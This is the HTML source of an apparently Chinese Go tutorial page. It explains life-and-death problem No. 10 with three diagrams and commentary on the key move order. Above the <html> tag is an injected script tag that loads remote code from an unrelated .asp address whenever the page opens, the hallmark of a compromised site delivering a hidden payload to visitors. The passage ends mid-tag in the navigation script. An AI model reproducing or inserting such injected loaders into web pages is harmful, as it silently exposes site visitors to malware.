<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第10型 黑先白死</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"><h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第10型      黑先白死</span></font><!--mstheme--></font></h1>       <div align="center">         <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">         <tr>           <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No10_1.png" width="232" height="232"><!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No10_2.png" width="232" height="232"><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1空拐，冷静的好手！此手如于2位尖顶，被白8位挤，不好办。白2顶，扩大眼位，黑3先扳，白4挡，黑5透点，是最为关键的次序！白6只好遮断，黑7尖、9扳，白成刀把五。</span></font>        <p>　<!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">前图的黑5如走本图的1位跨，白2遮断，黑3再尖，看似和正解图一样，其实漏算了重大次序。白不会于a位傻挡，而要走4位的立！接下来，黑a则白b，看出来了吧？</span></font><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No10_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1如果俗冲，白就要千恩万谢了。白2挡，黑3、5扳粘，见似破了白一眼，然而白6一走，黑就傻眼了。</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_derived/back_cmp_-1110_back_a.gif"); } // --></script><a href="../No9/No9.htm" language="JavaScr
